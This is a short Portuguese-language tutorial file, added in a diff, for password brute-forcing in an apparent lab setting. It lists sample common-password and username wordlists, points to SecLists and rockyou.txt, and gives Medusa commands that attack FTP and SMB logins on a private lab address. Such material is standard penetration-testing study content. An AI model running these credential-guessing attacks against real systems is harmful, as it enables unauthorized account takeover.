@@ -1,0 +1,35 @@
+1. common-passwords.txt
+Este arquivo contém senhas comuns usadas por muitas pessoas, facilitando ataques de dicionário. Você pode baixá-lo de repositórios como o SecLists ou criar um seu próprio com senhas frequentes. Aqui está um exemplo de conteúdo:
+
+text
+123456
+password
+123456789
+qwerty
+abc123
+iloveyou
+100200
+...
+2. users.txt
+Lista de nomes de usuário comuns ou nomes de usuários específicos que você quer testar, como:
+
+text
+admin
+admin1
+user
+test
+guest
+student
+manager
+Como montar as wordlists
+Você pode criar esses arquivos manualmente ou baixar de fontes confiáveis, como o SecLists.
+
+Para fins de testes internos, usar listas pequenas e específicas é suficiente; para testes mais avançados, use listas maiores, como o rockyou.txt (já presente nas distribuições Kali Linux).
+
+Exemplo de comandos para usar essas wordlists com Medusa
+bash
+# Ataque FTP
+medusa -h 192.168.56.101 -u admin -P wordlists/common-passwords.txt -M ftp
+
+# Ataque SMB com lista de usuários e senhas
+medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/common-passwords.txt -M smbnt
